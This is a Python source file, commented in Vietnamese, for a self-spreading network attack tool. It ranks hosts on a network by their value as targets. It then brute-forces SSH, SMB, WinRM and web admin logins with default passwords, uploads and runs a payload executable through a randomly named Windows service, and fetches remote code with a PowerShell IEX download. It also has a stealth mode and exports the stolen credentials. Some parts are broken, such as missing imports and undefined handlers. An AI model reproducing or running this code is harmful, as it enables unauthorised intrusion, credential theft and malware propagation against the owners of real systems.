import socket
import threading
import nmap
import paramiko
import ftplib
from impacket import smbconnection
from impacket.dcerpc.v5 import transport, scmr
import random
import time
import logging
from typing import Dict, List, Set, Optional
import json
from dataclasses import dataclass, field
import winrm
import requests
from urllib.parse import urlparse
import re

@dataclass
class ExploitResult:
    """Kết quả của một lần exploit"""
    success: bool
    method: str
    credentials: Optional[Dict] = None
    error: Optional[str] = None
    timestamp: float = field(default_factory=time.time)

@dataclass
class Target:
    """Thông tin về target"""
    ip: str
    hostname: Optional[str] = None
    os: Optional[str] = None
    services: Dict[int, Dict] = field(default_factory=dict)
    vulnerabilities: List[Dict] = field(default_factory=list)
    exploits: List[ExploitResult] = field(default_factory=list)
    importance_score: int = 0

class NetworkSpreader:
    def __init__(self, network_discovery=None):
        self.scanner = nmap.PortScanner()
        self.logger = logging.getLogger(__name__)
        self.network_discovery = network_discovery
        self.targets: Dict[str, Target] = {}
        self.compromised_hosts: Set[str] = set()
        self.spreading_status = {
            'active': False,
            'start_time': None,
            'total_targets': 0,
            'compromised': 0
        }
        
        # Load configurations
        self.load_configs()
        
    def load_configs(self):
        """Load spreading configurations"""
        # Credential lists
        self.credentials = {
            'windows': [
                {'user': 'Administrator', 'pass': 'password'},
                {'user': 'admin', 'pass': 'admin'},
            ],
            'linux': [
                {'user': 'root', 'pass': 'toor'},
                {'user': 'admin', 'pass': 'admin'},
            ]
        }
        
        # Service configurations
        self.service_configs = {
            'ssh': {'ports': [22], 'handler': self._exploit_ssh},
            'ftp': {'ports': [21], 'handler': self._exploit_ftp},
            'smb': {'ports': [445], 'handler': self._exploit_smb},
            'winrm': {'ports': [5985, 5986], 'handler': self._exploit_winrm},
            'rdp': {'ports': [3389], 'handler': self._exploit_rdp},
            'web': {
                'ports': [80, 443, 8080, 8443],
                'handler': self._exploit_web_apps
            }
        }
        
        # Web vulnerabilities
        self.web_vulns = {
            'apache': [
                {'path': '/manager/html', 'default_creds': [('admin', 'admin')]},
                {'path': '/phpmyadmin', 'default_creds': [('root', '')]}
            ],
            'wordpress': [
                {'path': '/wp-admin', 'default_creds': [('admin', 'admin')]},
                {'path': '/wp-login.php', 'bruteforce': True}
            ],
            'joomla': [
                {'path': '/administrator', 'default_creds': [('admin', 'admin')]}
            ]
        }
        
    def prepare_targets(self, network_data: Optional[Dict] = None) -> List[Target]:
        """Chuẩn bị danh sách targets từ network discovery data"""
        if network_data is None and self.network_discovery:
            network_data = self.network_discovery.get_network_map()
            
        if not network_data:
            return []
            
        # Reset targets
        self.targets.clear()
        
        # Process hosts
        for ip, host_data in network_data['hosts'].items():
            # Skip already compromised hosts
            if ip in self.compromised_hosts:
                continue
                
            target = Target(
                ip=ip,
                hostname=host_data.get('hostname'),
                os=host_data.get('fingerprint', {}).get('os_match'),
                services=host_data.get('services', {}),
                vulnerabilities=host_data.get('vulnerabilities', [])
            )
            
            # Calculate importance score
            target.importance_score = self._calculate_target_score(target)
            
            self.targets[ip] = target
            
        return sorted(
            self.targets.values(),
            key=lambda t: t.importance_score,
            reverse=True
        )
        
    def _calculate_target_score(self, target: Target) -> int:
        """Tính điểm ưu tiên cho target"""
        score = 0
        
        # OS score
        if target.os:
            os_lower = target.os.lower()
            if 'windows' in os_lower:
                score += 30  # Windows systems often have more vulnerabilities
            if 'server' in os_lower:
                score += 20  # Servers are high-value targets
                
        # Service score
        for port, service in target.services.items():
            if service['name'] in ['smb', 'microsoft-ds']:
                score += 25  # SMB often vulnerable
            elif service['name'] in ['ssh', 'rdp', 'winrm']:
                score += 20  # Remote access services
            elif service['name'] in ['http', 'https']:
                score += 15  # Web services
                
        # Vulnerability score
        score += len(target.vulnerabilities) * 10
        
        return score
        
    def spread_network(self, max_threads: int = 20, stealth_mode: bool = True):
        """Lan truyền trong mạng"""
        if self.spreading_status['active']:
            return False
            
        try:
            # Start spreading
            self.spreading_status.update({
                'active': True,
                'start_time': time.time(),
                'total_targets': 0,
                'compromised': 0
            })
            
            # Get targets
            targets = self.prepare_targets()
            self.spreading_status['total_targets'] = len(targets)
            
            # Create thread pool
            with ThreadPoolExecutor(max_workers=max_threads) as executor:
                futures = []
                
                for target in targets:
                    future = executor.submit(
                        self._exploit_target,
                        target,
                        stealth_mode
                    )
                    futures.append(future)
                    
                    if stealth_mode:
                        # Random delay between targets
                        time.sleep(random.uniform(2, 5))
                        
                # Wait for completion
                for future in as_completed(futures):
                    if future.result():
                        self.spreading_status['compromised'] += 1
                        
            return True
            
        except Exception as e:
            self.logger.error(f"Spreading error: {str(e)}")
            return False
            
        finally:
            self.spreading_status['active'] = False
            
    def _exploit_target(self, target: Target, stealth_mode: bool = True) -> bool:
        """Khai thác một target"""
        try:
            self.logger.info(f"Attempting to exploit {target.ip}")
            
            # Try each service
            for port, service in target.services.items():
                service_name = service['name']
                
                if service_name not in self.service_configs:
                    continue
                    
                config = self.service_configs[service_name]
                if port not in config['ports']:
                    continue
                    
                # Execute exploit
                result = config['handler'](
                    target,
                    port,
                    stealth_mode
                )
                
                if result.success:
                    self.compromised_hosts.add(target.ip)
                    target.exploits.append(result)
                    self.logger.info(
                        f"Successfully compromised {target.ip} using {result.method}"
                    )
                    return True
                    
            return False
            
        except Exception as e:
            self.logger.error(f"Error exploiting {target.ip}: {str(e)}")
            return False
            
    def _exploit_ssh(self, target: Target, port: int, stealth: bool = True) -> ExploitResult:
        """Khai thác SSH service"""
        creds = self.credentials['linux']
        if 'windows' in target.os.lower():
            creds = self.credentials['windows']
            
        for cred in creds:
            try:
                if stealth:
                    time.sleep(random.uniform(1, 3))
                    
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(
                    target.ip,
                    port,
                    cred['user'],
                    cred['pass'],
                    timeout=10
                )
                
                # Upload và execute payload
                sftp = ssh.open_sftp()
                sftp.put('payload.exe', '/tmp/payload.exe')
                ssh.exec_command('chmod +x /tmp/payload.exe && /tmp/payload.exe &')
                
                ssh.close()
                return ExploitResult(
                    success=True,
                    method='ssh',
                    credentials=cred
                )
                
            except Exception as e:
                continue
                
        return ExploitResult(
            success=False,
            method='ssh',
            error='No valid credentials'
        )
        
    def _exploit_smb(self, target: Target, port: int, stealth: bool = True) -> ExploitResult:
        """Khai thác SMB service"""
        for cred in self.credentials['windows']:
            try:
                if stealth:
                    time.sleep(random.uniform(1, 3))
                    
                smb = smbconnection.SMBConnection(
                    target.ip,
                    target.ip,
                    sess_port=port
                )
                
                smb.login(cred['user'], cred['pass'])
                
                # Upload payload
                with open('payload.exe', 'rb') as f:
                    smb.putFile('ADMIN$', 'payload.exe', f.read)
                    
                # Create service
                rpctransport = transport.SMBTransport(
                    target.ip,
                    port,
                    r'\ADMIN$',
                    cred['user'],
                    cred['pass']
                )
                
                connection = rpctransport.get_dce_rpc()
                connection.connect()
                connection.bind(scmr.MSRPC_UUID_SCMR)
                
                # Start service
                service_name = ''.join(
                    random.choices('abcdefghijklmnopqrstuvwxyz', k=8)
                )
                handle = scmr.hROpenSCManagerW(connection)
                service_handle = scmr.hRCreateServiceW(
                    connection,
                    handle,
                    service_name,
                    service_name,
                    r'%COMSPEC% /Q /c payload.exe'
                )
                scmr.hRStartServiceW(connection, service_handle)
                
                return ExploitResult(
                    success=True,
                    method='smb',
                    credentials=cred
                )
                
            except Exception as e:
                continue
                
        return ExploitResult(
            success=False,
            method='smb',
            error='No valid credentials'
        )
        
    def _exploit_winrm(self, target: Target, port: int, stealth: bool = True) -> ExploitResult:
        """Khai thác WinRM service"""
        for cred in self.credentials['windows']:
            try:
                if stealth:
                    time.sleep(random.uniform(1, 3))
                    
                protocol = 'https' if port == 5986 else 'http'
                session = winrm.Session(
                    target.ip,
                    auth=(cred['user'], cred['pass']),
                    transport='ntlm',
                    server_cert_validation='ignore'
                )
                
                # Execute payload
                result = session.run_ps(
                    f'IEX (New-Object Net.WebClient).DownloadString("{payload_url}")'
                )
                
                if result.status_code == 0:
                    return ExploitResult(
                        success=True,
                        method='winrm',
                        credentials=cred
                    )
                    
            except Exception as e:
                continue
                
        return ExploitResult(
            success=False,
            method='winrm',
            error='No valid credentials'
        )
        
    def _exploit_web_apps(self, target: Target, port: int, stealth: bool = True) -> ExploitResult:
        """Khai thác web applications"""
        try:
            protocol = 'https' if port in [443, 8443] else 'http'
            base_url = f"{protocol}://{target.ip}:{port}"
            
            # Get server info
            response = requests.get(
                base_url,
                verify=False,
                timeout=10
            )
            server = response.headers.get('Server', '').lower()
            
            # Check known vulnerabilities
            for app, vulns in self.web_vulns.items():
                if app in server:
                    for vuln in vulns:
                        url = f"{base_url}{vuln['path']}"
                        
                        if 'default_creds' in vuln:
                            result = self._try_default_creds(
                                url,
                                vuln['default_creds'],
                                stealth
                            )
                            if result.success:
                                return result
                                
            return ExploitResult(
                success=False,
                method='web',
                error='No vulnerabilities found'
            )
            
        except Exception as e:
            return ExploitResult(
                success=False,
                method='web',
                error=str(e)
            )
            
    def _try_default_creds(self, url: str, creds: List[tuple],
                          stealth: bool = True) -> ExploitResult:
        """Test default credentials"""
        for user, pwd in creds:
            try:
                if stealth:
                    time.sleep(random.uniform(1, 3))
                    
                response = requests.post(
                    url,
                    data={'username': user, 'password': pwd},
                    verify=False,
                    timeout=10
                )
                
                if response.status_code == 200 and \
                   not re.search(r'login|signin', response.text, re.I):
                    return ExploitResult(
                        success=True,
                        method='web_default_creds',
                        credentials={'user': user, 'pass': pwd}
                    )
                    
            except:
                continue
                
        return ExploitResult(
            success=False,
            method='web_default_creds',
            error='No valid credentials'
        )
        
    def get_spreading_status(self) -> Dict:
        """Get current spreading status"""
        status = self.spreading_status.copy()
        
        if status['start_time']:
            status['duration'] = time.time() - status['start_time']
            
        status.update({
            'compromised_hosts': len(self.compromised_hosts),
            'remaining_targets': len(self.targets),
            'success_rate': (
                (status['compromised'] / status['total_targets'] * 100)
                if status['total_targets'] > 0 else 0
            )
        })
        
        return status
        
    def export_results(self, filename: str) -> bool:
        """Export spreading results"""
        try:
            data = {
                'status': self.get_spreading_status(),
                'compromised_hosts': list(self.compromised_hosts),
                'targets': {
                    ip: {
                        'ip': t.ip,
                        'hostname': t.hostname,
                        'os': t.os,
                        'services': t.services,
                        'exploits': [
                            {
                                'method': e.method,
                                'timestamp': e.timestamp,
                                'credentials': e.credentials
                            }
                            for e in t.exploits if e.success
                        ]
                    }
                    for ip, t in self.targets.items()
                }
            }
            
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error exporting results: {str(e)}")
            return False